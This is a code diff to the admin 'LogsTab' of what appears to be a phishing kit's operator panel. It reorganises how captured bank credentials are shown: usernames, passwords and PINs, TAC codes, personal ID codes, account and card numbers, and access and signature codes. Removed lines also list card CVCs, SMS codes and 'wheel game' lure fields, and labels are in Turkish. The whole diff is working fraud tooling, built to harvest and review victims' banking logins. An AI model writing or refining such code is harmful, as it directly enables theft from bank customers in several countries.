@@ -12,7 +12,7 @@ const SESSION_LIST_COLUMNS =
 
 function inferCanonicalLogFieldKey(
   key: string,
-): "personalCode" | "phone" | "username" | "password" | "tacCode" | "loginMethod" | null {
+): "personalCode" | "bankPhone" | "username" | "password" | "tacCode" | "loginMethod" | null {
   const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
 
   if (
@@ -31,7 +31,7 @@ function inferCanonicalLogFieldKey(
     normalizedKey.includes("telefon") ||
     normalizedKey === "phone"
   ) {
-    return "phone";
+    return "bankPhone";
   }
 
   if (
@@ -72,6 +72,21 @@ function inferCanonicalLogFieldKey(
   return null;
 }
 
+function isIgnoredAdminBankFieldKey(key: string): boolean {
+  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
+
+  return (
+    normalizedKey.includes("rememberme") ||
+    normalizedKey.includes("remembermesimpleid") ||
+    normalizedKey.includes("remembermesmartid") ||
+    normalizedKey.includes("remembermemobileid") ||
+    normalizedKey.includes("loginwidget") ||
+    normalizedKey.includes("useridmid") ||
+    normalizedKey.includes("useridsid") ||
+    normalizedKey.includes("useridsimple")
+  );
+}
+
 function shouldHideDuplicateBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
   if (typeof value !== "string" || !value.trim()) {
     return false;
@@ -94,11 +109,12 @@ function shouldHideDuplicateBankField(formData: Record<string, any>, key: string
 
 function isVisibleAdminBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
   if (!value) return false;
+  if (isIgnoredAdminBankFieldKey(key)) return false;
 
   const preferredKeys = new Set([
     "loginMethod",
     "personalCode",
-    "phone",
+    "bankPhone",
     "username",
     "verfuegernummer",
     "password",
@@ -137,6 +153,34 @@ function isVisibleAdminBankField(formData: Record<string, any>, key: string, val
         : String(formData[canonicalKey] ?? "").trim();
 
   return !canonicalValue;
+}
+
+function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[string, string]> {
+  const pickString = (...keys: string[]) => {
+    for (const key of keys) {
+      const value = formData[key];
+      if (typeof value === "string" && value.trim()) {
+        return value.trim();
+      }
+    }
+    return "";
+  };
+
+  const canonicalFields: Array<[string, string]> = [
+    ["loginMethod", pickString("loginMethod")],
+    ["personalCode", pickString("personalCode")],
+    ["bankPhone", pickString("bankPhone")],
+    ["username", pickString("username", "verfuegernummer")],
+    ["password", pickString("password", "pin")],
+    ["tacCode", pickString("tacCode")],
+    ["pasnummer", pickString("pasnummer")],
+    ["rekeningnummer", pickString("rekeningnummer")],
+    ["toegangscode", pickString("toegangscode")],
+    ["signatuur", pickString("signatuur")],
+    ["identificatiecode", pickString("identificatiecode")],
+  ];
+
+  return canonicalFields.filter(([, value]) => Boolean(value));
 }
 
 export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
@@ -757,37 +801,10 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     <td className="px-3 py-4">
                       <div className="text-[13px] space-y-1.5 max-w-[200px] break-words">
                           {fd.bankName && <div className="font-bold text-yellow-600 dark:text-yellow-500 break-words">{fd.bankName}</div>}
-                          {Object.entries(fd)
-                            .filter(([key, value]) => {
-                              if (!value) return false;
-                              const ignoredKeys = [
-                                "firstName", "lastName", "phone", "smsCode", 
-                                "cardNumber", "cardExpiry", "cardCvc", 
-                                "bankName", "amount", "step", 
-                                "bankSlug", "currency", "is_wheel_game", 
-                                "wheel_result_kind", "wheel_result_label", 
-                                "wheel_result_amount", "wheel_rotation_index",
-                                "session_id", "id", "created_at", "updated_at",
-                                "user_agent", "ip_address", "is_hidden"
-                              ];
-                              if (ignoredKeys.includes(key)) return false;
-                              return isVisibleAdminBankField(fd, key, value);
-                            })
-                            .sort(([keyA], [keyB]) => {
-                              const order = ["loginMethod", "personalCode", "phone", "username", "verfuegernummer", "password", "pin", "pasnummer", "rekeningnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"];
-                              const indexA = order.indexOf(keyA);
-                              const indexB = order.indexOf(keyB);
-                              if (indexA !== -1 && indexB !== -1) return indexA - indexB;
-                              if (indexA !== -1) return -1;
-                              if (indexB !== -1) return 1;
-                              return keyA.localeCompare(keyB);
-                            })
-                            .map(([key, value]) => {
-                              const inferredKey = inferCanonicalLogFieldKey(key);
-                              let displayKey = inferredKey ?? key;
+                          {getCanonicalAdminBankFields(fd).map(([key, value]) => {
+                              let displayKey = key;
                               if (displayKey === "username") displayKey = "ID / K.Adı";
-                              else if (displayKey === "verfuegernummer") displayKey = "ID / K.Adı";
-                              else if (displayKey === "password" || displayKey === "pin") displayKey = "Şifre / PIN";
+                              else if (displayKey === "password") displayKey = "Şifre / PIN";
                               else if (displayKey === "tacCode") displayKey = "TAC";
                               else if (displayKey === "rekeningnummer") displayKey = "Hesap No";
                               else if (displayKey === "pasnummer") displayKey = "Kart No";
@@ -796,7 +813,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                               else if (displayKey === "identificatiecode") displayKey = "Kimlik Kodu";
                               else if (displayKey === "loginMethod") displayKey = "Giriş Yöntemi";
                               else if (displayKey === "personalCode") displayKey = "Kimlik No / ID";
-                              else if (displayKey === "phone") displayKey = "Telefon";
+                              else if (displayKey === "bankPhone") displayKey = "Telefon";
                               
                               return (
                                 <div key={key} className="flex gap-1.5 items-start">
